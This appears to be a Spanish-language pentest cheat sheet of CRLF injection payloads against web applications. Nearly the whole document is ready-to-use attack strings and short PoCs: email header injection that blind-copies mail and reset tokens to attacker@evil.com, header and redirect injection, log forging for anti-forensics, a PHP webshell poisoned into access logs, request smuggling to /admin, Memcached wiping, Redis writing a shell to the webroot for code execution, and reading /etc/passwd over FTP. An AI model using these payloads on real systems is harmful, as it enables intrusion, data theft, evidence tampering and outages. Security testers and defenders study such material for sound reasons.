---
aliases:
  - SMTP Injection
  - Email Header Injection
  - Log Poisoning CRLF
  - Memcached Injection
tags:
  - vuln/crlf-injection
  - technique/initial-access
  - technique/lateral-movement
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[CRLF Injection]]"
  - "[[HTTP Request Smuggling]]"
---
# CRLF Injection - Vectores Específicos

---

## Email Header Injection (SMTP)

| **Payload (en contact form)** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `from=victim@target.com%0d%0aBcc:%20attacker@evil.com` | BCC oculta hacia atacante en cada email | Contact form pasa `from` a SMTP. |
| `subject=Hello%0d%0aBcc:%20attacker@evil.com,spam@list.com` | Bulk BCC para mass spam | Subject reflejado en headers SMTP. |
| `from=x%0d%0aReply-To:%20attacker@evil.com` | Reply-To dirigido a atacante | Respuesta de víctima va al atacante. |
| `from=x%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>...</script>` | HTML email con XSS en cliente | Cliente con HTML rendering vulnerable. |
| `subject=Hola%0d%0a%0d%0aBody completo controlado` | Override completo del body del email | App concatena subject pre-body sin escape. |
| `from=x%0d%0aMIME-Version:%201.0%0d%0aContent-Type:%20multipart/mixed;boundary=X%0d%0a%0d%0a--X%0d%0aContent-Disposition:%20attachment;filename=evil.exe%0d%0a%0d%0a<base64>` | MIME attachment malicioso inyectado | Backend con `mail()` PHP legacy. |
^crlfi-specific-smtp

### PoC SMTP CRLF injection

```
Contact form: from=victim@target.com&subject=Hello

Atacante's payload:
from=victim@target.com%0d%0aBcc:%20attacker@evil.com&subject=Hello

Resulting email (SMTP layer):
From: victim@target.com
Bcc: attacker@evil.com         ← inyectado, oculto del recipient
Subject: Hello

Email body...

→ Atacante recibe copia de cada email enviado.
→ Combine con password reset → atacante intercepta tokens.
```

---

## Redirect Injection (`Location:` Header)

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `?url=ok%0d%0aSet-Cookie:%20a=1` | Location + Set-Cookie inyectada | Session fixation via redirect. |
| `?url=https://target%0d%0aLocation:%20https://attacker.com` | Dos `Location:` — browser usa el último (típico) | Open Redirect via header inject. |
| `?url=ok%0d%0aRefresh:%200;url=//attacker.com` | Refresh header redirige sin honrar Location | App con `Location` whitelisted pero `Refresh` no validado. |
| `?url=ok%0d%0aStrict-Transport-Security:%20max-age=0` | HSTS downgrade habilita HTTP MITM | Combo con SSL strip. |
| `?url=https://target.com%2f%40attacker.com` | URL parser confusion (path vs userinfo) | Combo con Open Redirect parser bug. |
^crlfi-specific-redirect

---

## Log Injection / Log Poisoning

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `?u=admin%0d%0a2025-01-01T00:00:00%20INFO%20legitimate%20entry` | Línea de log falsa indistinguible | Anti-forensics — esconder actividad. |
| `User-Agent: <?php system($_GET[c]); ?>` | PHP code en `access.log` | Combo con LFI → ejecución vía `include('/var/log/apache2/access.log')`. |
| `?username=foo%0d%0a%5BERROR%5D%20Failed%20login:%20admin` | Inyecta fake errores que distraen análisis SIEM | Anti-detection. |
| `?q=test%0d%0a127.0.0.1%20-%20-%20%5B...%5D%20"GET%20/legit%20HTTP/1.1"%20200%20512` | Línea de log con request falso | Polución de logs para confundir IR. |
| `?msg=test%0d%0a<134>1%202025-01-01T00:00:00Z%20fakehost%20app%20-%20-%20-%20<malicious>` | Syslog priority manipulation | Logs forwarded a SIEM con parsing por priority. |
^crlfi-specific-log

---

## HTTP Request Smuggling Combo

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `X-Forwarded-For: a%0d%0aTransfer-Encoding:%20chunked` | Inyecta TE en backend → desync front/back | Proxy reenvía header completo, backend reparsea TE. |
| `Host: target.com%0d%0aContent-Length:%204400` | Inyecta CL mayor → smuggle siguiente request | TE.CL o CL.CL desync. |
| HTTP/2 pseudo-header `:path` con `%0d%0aFoo:%20bar` | Header smuggling H2→H1 downgrade | Frontend H2, backend H1. |
| `?param=x%0d%0aHost:%20internal.svc` | Reescribe Host hacia vhost interno | Combo con virtual host routing. |
| `?param=x%0d%0aAuthorization:%20Bearer%20...%0d%0a%0d%0aGET%20/admin%20HTTP/1.1%0d%0aHost:%20target%0d%0a%0d%0a` | Smuggle de request completo a `/admin` | Backend con CL/TE laxos. |
^crlfi-specific-hrs

---

## Memcached / Redis / FTP via Newlines

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `name=foo\r\nflush_all\r\n` | Wipe completo de cache Memcached | App concatena `name` en `get user:NAME`. |
| `key=foo\r\nset evil 0 3600 5\r\nXSSED\r\n` | Atacante setea key arbitraria en Memcached | Cache poisoning directo. |
| `key=foo\r\nDEL admin_session\r\n` | Borra clave de sesión admin en Redis (RESP) | App con Redis client text-protocol. |
| `key=foo\r\nCONFIG SET dir /var/www/html\r\nCONFIG SET dbfilename shell.php\r\nSET x "<?php system($_GET[0]); ?>"\r\nSAVE\r\n` | RCE via Redis SAVE en webroot | Redis sin auth + webroot escribible. |
| `cmd=USER%20a%0d%0aRETR%20/etc/passwd` | FTP command injection via newline | Backend que construye FTP commands con user input. |
| `q=a%0d%0aMAIL%20FROM:%20<attacker>%0d%0aRCPT%20TO:%20<v>%0d%0aDATA` | SMTP command injection via SSRF | Combo SSRF + gopher hacia SMTP interno. |
^crlfi-specific-protocols

### Memcached injection PoC

```
Backend code (vulnerable):
def get_user(name):
    key = f"user:{name}"  # ← user input concatenated
    return memcached.get(key)

Atacante input: name = "atacante\r\nflush_all\r\n"

Resulting memcached protocol:
get user:atacante
flush_all                  ← inyectado! Cache wipeada.

→ Cache poisoning + DoS.
→ Combine: atacante setea propias keys + invalida legit.
```

---
